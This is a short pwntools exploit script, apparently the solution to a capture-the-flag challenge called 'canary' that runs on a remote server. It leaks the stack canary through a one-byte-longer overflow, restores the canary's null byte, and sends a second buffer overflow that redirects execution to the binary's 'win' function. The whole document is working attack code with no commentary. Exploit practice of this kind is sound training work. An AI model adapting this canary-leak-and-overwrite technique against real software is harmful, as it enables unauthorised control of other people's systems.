from pwn import *

#context.terminal = ['tmux', 'splitw', '-h', '-p 65'] 

e = ELF('./canary')
#r = process('./canary')
r = remote('34.64.219.95', 19519)

#gdb.attach(r)

WIN_ADDR = p64(e.symbols["win"])
RET_ADDR = p64(0x4011ef)

PAYLOAD = b'\x41' * (0x38 + 0x1)

r.send(PAYLOAD)

r.recv(0x38)

CANARY = r.recv(8)
CANARY = b'\x00' + CANARY[1:]

print(CANARY)

PAYLOAD = b'\x41' * 0x38
PAYLOAD += CANARY
PAYLOAD += b'\x42' * 0x8
#PAYLOAD += RET_ADDR
PAYLOAD += WIN_ADDR

r.sendline(PAYLOAD)

r.interactive()